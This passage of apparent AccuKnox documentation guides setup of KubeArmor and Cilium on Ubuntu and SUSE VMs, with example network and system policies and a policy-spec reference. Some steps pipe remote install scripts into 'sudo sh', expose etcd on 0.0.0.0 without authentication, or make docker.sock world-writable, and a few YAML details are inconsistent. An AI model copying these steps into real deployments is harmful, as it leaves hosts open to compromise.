\"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www-google-co-in.yaml </code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml\n</code></pre> <p></p>"},{"location":"open-source/suse_les_15/suse_les_15/#step-11-policy-violation-on-worker-node","title":"Step 11: Policy Violation on worker node","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/","title":"Ubuntu18.04","text":""},{"location":"open-source/ubuntu18.04/ubuntu18.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on kubernetes workloads.</p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and check the status of etcd:</p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd enable\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Pre-requisites: Download and Install Go</p> <p>Visit Go Website for Latest Version</p> <pre><code>wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz\n</code></pre> <p>Untar file:</p> <pre><code>rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz\n</code></pre> <pre><code>vim /etc/profile </code></pre> <p>Paste the below path in /etc/profile:</p> <pre><code>export PATH=$PATH:/usr/local/go/bin\n</code></pre> <p>Run the following command:</p> <pre><code>source /etc/profile </code></pre> <p>Clone KVM-Service code and checkout to non-k8s branch:</p> <pre><code>sudo git clone https://github.com/kubearmor/kvm-service.git\n</code></pre> <p></p> <pre><code>cd /kvm-service/\n</code></pre> <pre><code>sudo git checkout non-k8s\n</code></pre> <p></p> <p>Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code:</p> <pre><code>make\n</code></pre> <p></p> <p></p> <p>Once compilation is successful, run KVM-Service using the following command:</p> <pre><code>sudo ./kvmservice --non-k8s 2&gt; /dev/null\n</code></pre> <p></p> <p>Note: Let keep it running and continue in new terminal.</p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<p>Run the following command to Install Karmor utility:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>vim kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command.</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-5-generate-installation-scripts-for-configured-vm","title":"Step 5: Generate Installation scripts for configured VM","text":"<pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p>Output:</p> <p>VM installation script copied to testvm1.sh</p> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-6-execute-the-installation-script-in-docker-installed-vm","title":"Step 6: Execute the Installation script in Docker Installed VM","text":"<p>Install pre-requisites:</p> <pre><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD\n</code></pre> <pre><code>echo \"deb https://repo.iovisor.org/apt/$(lsb_release -cs) $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list\n</code></pre> <pre><code>sudo apt-get update\n</code></pre> <pre><code>sudo apt-get install bcc-tools libbcc-examples linux-headers-$(uname -r)\n</code></pre> <pre><code>sudo apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre> <pre><code>sudo apt-get install linux-headers-generic\n</code></pre> <pre><code>sudo apt --fix-broken install\n</code></pre> <pre><code>sudo apt-get update\n</code></pre> <p>Install Docker:</p> <pre><code>sudo apt-get update\n</code></pre> <pre><code>sudo apt install docker.io\n</code></pre> <pre><code>sudo systemctl start docker\n</code></pre> <pre><code>sudo systemctl enable docker\n</code></pre> <pre><code>sudo systemctl status docker\n</code></pre> <p></p> <p>Comment the following line on the script and save it:</p> <pre><code>vi testvm1\n</code></pre> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE      $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following commands:</p> <pre><code>sudo su -\n</code></pre> <pre><code>chmod 777 testvm1.sh\n</code></pre> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the kvm-service is running on control plane VM &amp; To onboard more worker VM repeat Step 6, Step 7 &amp; Step 8.</p> <p>You can Verify by running following command,</p> <pre><code>docker ps\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-7-install-kubearmor-on-worker-vm","title":"Step 7: Install Kubearmor on worker VM","text":"<p>Download &amp; Install the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb &amp;&amp; sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-8-apply-and-verify-kubearmor-system-policy","title":"Step 8: Apply and Verify KubeArmor system policy","text":"<p>1. Apply the policy</p> <pre><code>vim sleepdenypolicy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-kubearmor-dev-proc-path-block\nspec:\nprocess:\nmatchPaths:\n- path: bin/sleep # try sleep 1\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add sleepdenypolicy.yaml\n</code></pre> <p></p> <p>Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access.</p> <p>2. Violating the policy</p> <pre><code>sleep 2\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p> <p>3. Deleting the applied policy </p> <pre><code>karmor vm --kvms policy delete sleepdenypolicy.yaml\n</code></pre> <p></p>"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-9-apply-and-verify-cilium-network-policy","title":"Step 9: Apply and Verify Cilium network policy","text":"<p>1. Apply the policy</p> <pre><code>vim port80-allow.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"vm1-allow-http\"\nspec:\ndescription: \"L4 policy to allow traffic at port 80/TCP\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add port80-allow.yaml\n</code></pre> <p></p> <p>Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied.</p> <p>2. Violating the policy</p> <p></p> <p>Output : Unable to SSH the VM via 22 port</p> <p>3. Deleting the applied policy</p> <pre><code>karmor vm --kvms policy delete port80-allow.yaml\n</code></pre> <p></p> <p>Output : Now able to do SSH</p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/","title":"Ubuntu20.04","text":""},{"location":"open-source/ubuntu20.04/ubuntu20.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on kubernetes workloads.</p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo su\n</code></pre> <pre><code>apt update\n</code></pre> <pre><code>apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>vim /etc/default/etcd\n</code></pre> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd:</p> <pre><code>service etcd restart\n</code></pre> <pre><code>service etcd status\n</code></pre> <pre><code>service etcd enable\n</code></pre> <p></p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-2-installing-bcc","title":"Step 2: Installing BCC","text":"<pre><code>apt install -y bison build-essential cmake flex git libedit-dev \\\n&gt;   libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils\n</code></pre> <pre><code>git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git\n</code></pre> <pre><code>mkdir bcc/build; cd bcc/build\n</code></pre> <pre><code>cmake ..\n</code></pre> <pre><code>make\n</code></pre> <pre><code>make install\n</code></pre> <pre><code>cmake -DPYTHON_CMD=python3 ..\n</code></pre> <pre><code>pushd src/python/ &amp;&amp; make\n</code></pre> <pre><code>make install\n</code></pre>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-3-install-kvm-service-in-control-plane","title":"Step 3: Install KVM-Service in control plane","text":"<p>Pre-requisites: Download &amp; Install Go</p> <p>Visit Go website for latest version</p> <pre><code>wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz\n</code></pre> <p>Untar file:</p> <pre><code>rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz\n</code></pre> <pre><code>vim /etc/profile </code></pre> <p>Paste the below path in /etc/profile:</p> <pre><code>export PATH=$PATH:/usr/local/go/bin\n</code></pre> <p>Run the following command:</p> <pre><code>source /etc/profile </code></pre> <p>Note: KVM-Service requires that all the managed VMs should be within the same network.</p> <pre><code>git clone https://github.com/kubearmor/kvm-service.git </code></pre> <pre><code>cd kvm-service &amp;&amp; git checkout non-k8s </code></pre> <pre><code>cd src/service/ &amp;&amp; make </code></pre> <pre><code>./kvmservice --non-k8s 2&gt; /dev/null  </code></pre> <p></p> <p>Note: Let it keep running &amp; continue in new terminal.</p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-4-install-karmor-in-control-plane","title":"Step 4: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-5-onboard-vms-using-karmor","title":"Step 5: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <pre><code>karmor vm list\n</code></pre>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-6-generate-installation-scripts-for-configured-vm","title":"Step 6: Generate Installation scripts for configured VM","text":"<pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-7-execute-the-installation-script-in-vm","title":"Step 7: Execute the Installation script in VM","text":"<pre><code>sudo su </code></pre> <pre><code>apt update\n</code></pre> <p>Note: Docker needs to be Installed before runing the script. </p> <pre><code>apt install docker.io\n</code></pre> <pre><code>chmod 666 /var/run/docker.sock\n</code></pre> <p>Copy the Generated Installation scripts to appropriate VM: </p> <pre><code>scp -r testvm1.sh [root@IP:/path]\n</code></pre> <pre><code>chmod +x testvm1.sh\n</code></pre> <pre><code>./testvm1.sh </code></pre> <pre><code>docker ps\n</code></pre> <p></p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-8-installing-kubearmor-worker-node","title":"Step 8: Installing Kubearmor worker node","text":"<p>Install pre-requisites:</p> <pre><code>apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.2.1/kubearmor_0.2.1_linux-amd64.deb &amp;&amp; dpkg -i kubearmor_0.2.1_linux-amd64.deb\n</code></pre> <p></p> <p>If above error occurs, Run:</p> <pre><code>apt --fix-broken install\n</code></pre> <p></p> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-9-apply-and-verify-kubearmor-system-policy","title":"Step 9: Apply and Verify Kubearmor system policy","text":"<p>1. Apply the policy</p> <pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p><pre><code>karmor vm --kvms policy add khp-example-vmname.yaml\n</code></pre> Output:</p> <p>success</p> <p>Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access.</p> <p>2. Violating the policy</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-10-apply-and-verify-cilium-network-policy","title":"Step 10: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>vim vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.128.0.6/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <p></p> <p>Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused .</p> <p></p> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>vim vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\negress:\n- fromCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml\n</code></pre> <p></p> <p>3. This policy allow DNS access in VM</p> <pre><code>vim vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <p></p> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>vim vm-allow-www-google-co-in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml\n</code></pre> <p></p> <p>Violating the Policy:</p> <pre><code>curl http://www.google.co.in/\n</code></pre> <p></p> <pre><code>curl https://go.dev/\n</code></pre> <p></p> <p>Verifying policy Violation logs: </p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"policies-and-rule/policies-and-rule/","title":"Policies and Rules","text":""},{"location":"policies-and-rule/policies-and-rule/#policies-and-rules","title":"Policies and rules","text":"<p>Accuknox support three types of policies. Network-Ingress, Network-Egress and System Policies.</p> <p>The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. System Policy restricts the behavior (such as process execution, file access, networking operation and capabilities) of pods and nodes at the system level.</p>"},{"location":"policies-and-rule/policies-and-rule/#structure-of-network-policy","title":"Structure of network policy","text":"<p>Network-egress Policy Specification</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: [policy name]\n  description: [Policy Desciption]\nspec:\n  endpointSelector:          \n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\negress:\n  - toEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - toCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n  - toEntities:\n    - [entity]\n  - toServices:\n    - k8sService:\n        serviceName: [service name]\n        namespace: [namespace] \n  - toFQDNs:\n      - matchName: [domain name]\n      - matchPattern: [domain name pattern]\n</code></pre> <p>Network-ingress Policy Specification</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: [policy name]\n  description: [Policy Desciption]\nspec:\n  endpointSelector:          \n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\ningress:\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - fromEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - fromEntities:\n    - [entity]\n  - fromCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n</code></pre>"},{"location":"policies-and-rule/policies-and-rule/#policy-spec-description","title":"Policy Spec Description","text":"<p>Here, we will briefly explain how to define the network policy.</p> <p>A network policy starts with base information such as</p> <ul> <li> <p>Policy Name</p> <ul> <li>Name of the Policy</li> </ul> </li> <li> <p>Description</p> <ul> <li>Description for the Policy</li> </ul> </li> <li> <p>Policy Type</p> <ul> <li>Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restricts behavior at system level.</li> </ul> </li> <li> <p>Namespace</p> <ul> <li>Namespace will tell in which namespace that policy is going to apply.</li> </ul> </li> <li> <p>Default/Node</p> <ul> <li>This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster. Node Selectors can only be used in CiliumClusterwideNetworkPolicy. If you change here from default to node then kind will get changed from <code>CiliumNetworkPolicy</code> to <code>CiliumClusterwideNetworkPolicy</code></li> </ul> </li> <li> <p>Labels</p> <ul> <li>Labels are used to select specified endpoints (in most cases it will be pods) and nodes.</li> </ul> </li> </ul> <p></p> <p>After creating policy following yaml will be filled.</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: [policy name]\n  description: [Policy Desciption]\nspec:\n  endpointSelector:          \n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\n</code></pre> <p>Egress: In the egress rule, we have 6 different types. First, matchLabels is the same as the selector case, so we can specify the destination based on the labels.</p> <p>toPorts is a list of the port filter, and the port and protocol mean the port number and its protocol respectively. It restricts the ability of an endpoint to emit and/or receive packets on a particular port using a particular protocol.</p> <p>toCIDRSet rules are used to define policies to limit external access to a particular IP range.</p> <p>toEntities rules are used to describe the entities that can be accessed by the selector. The applicable entities are host (the local host), remote-node (other hosts in the cluster than the local host), world (the same as CIDR 0.0.0.0/0) and all.</p> <p>toServices rules can be used to restrict access to the service running in the cluster. But, these services should not use the selector. In other words, it supports the services without the selector only. Thus, if users want to use toServices rules, there should be the service and its endpoints respectively.</p> <p>toFQDNs rules are used to define the policies that have DNS queryable domain names.</p> <pre><code>ingress:\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - fromEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - fromEntities:\n    - [entity]\n  - fromCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n</code></pre> <p></p> <p>Ingress: In the ingress rule, we have 4 different types; matchLables, toPorts, fromEntities and fromCIDRSet And these are working as the egress does.</p> <pre><code>ingress:\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - fromEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - fromEntities:\n    - [entity]\n  - fromCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n</code></pre> <p></p>"},{"location":"policies-and-rule/policies-and-rule/#deny-policies","title":"Deny Policies","text":"<p>Deny policies allows to explicitly restrict certain traffic to and from a Pod. Deny policies take precedence over allow policies.</p> <p>Policy Structure</p> <p></p> <p>Existing inter-cluster policies will still be allowed as this policy is allowing traffic from everywhere except from \u201cworld\u201d.</p>"},{"location":"policies-and-rule/policies-and-rule/#host-policies","title":"Host Policies","text":"<p>Host policies take the form of a CiliumClusterwideNetworkPolicy with a Node Selector instead of an Default Selector.</p> <p>Host policies apply to all the nodes selected by their Node Selector.</p>"},{"location":"policies-and-rule/policies-and-rule/#structure-of-system-policy","title":"Structure of System Policy","text":""},{"location":"policies-and-rule/policies-and-rule/#policy-specification","title":"Policy Specification","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind:KubeArmorPolicy\nmetadata:\n  name: [policy name]\n  namespace: [namespace name]\nspec:                       \n  selector:                               # --&gt; For KubeArmorHostPolicy selector will be nodeSelector\n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\n\n  process:\n    severity: [1-10]                       \n    matchPaths:\n    - path: [absolute executable path]\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  file:\n    severity: [1-10]                       \n    matchPaths:\n    - path: [absolute file path]\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  network:\n    severity: [1-10]                       \n    matchProtocols:\n    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  capabilities:\n    severity: [1-10]                       \n    matchCapabilities:\n    - capability: [capability name]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n</code></pre>"},{"location":"policies-and-rule/policies-and-rule/#policy-spec-description_1","title":"Policy Spec Description","text":"<p>Now, we will briefly explain how to define a system policy.</p> <ul> <li> <p>Common</p> <p>A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy.</p> </li> <li> <p>Severity</p> <p>The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.</p> </li> <li> <p>Selector</p> <p>The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) pods based on labels.</p> </li> <li> <p>Process</p> <p>In the process section, there are 2 types of matches: matchPaths and matchDirectories. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In Each match, there are three options.</p> <ul> <li> <p>ownerOnly (static action: allow owner only; otherwise block all)</p> <p>If this is enabled, the owners of the executable(s) defined with matchPaths and matchDirectories will be only allowed to execute.</p> </li> <li> <p>recursive</p> <p>If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories.</p> </li> <li> <p>fromSource</p> <p>If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories.</p> </li> </ul> </li> <li> <p>File</p> <p>The file section is quite similar to the process section. The only difference between 'process' and 'file' is the readOnly option.</p> <ul> <li> <p>readOnly (static action: allow to read only; otherwise block all)</p> <p>If this is enabled, the read operation will be only allowed, and any other operations (e.g., write) will be blocked.</p> </li> </ul> </li> <li> <p>Network</p> <p>In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP.</p> </li> <li> <p>Capabilities</p> <p>In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities.</p> </li> <li> <p>Action</p> <p>The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action.</p> </li> </ul>"},{"location":"policies-and-rule/policies-and-rule/#system-policy-specification-for-hosts","title":"System Policy Specification for Hosts","text":"<p>Policy Specification for Host is similar to the previous one. We will point out only differences.</p> <ul> <li> <p>In host policy kind will be KubeArmorHostPolicy, not KubeArmorPolicy.</p> </li> <li> <p>NodeSelector</p> <ul> <li>The node selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify (a group of) nodes based on labels.</li> </ul> </li> <li> <p>Action</p> <p>The action could be Audit or Block in general. In order to use the Allow action, you should define 'fromSource'; otherwise, all Allow actions will be ignored by default.</p> <p><code>action: [Audit|Block]</code></p> <p>If 'fromSource' is defined, we can use all actions for specific rules.</p> <p><code>action: [Allow|Audit|Block]</code></p> </li> 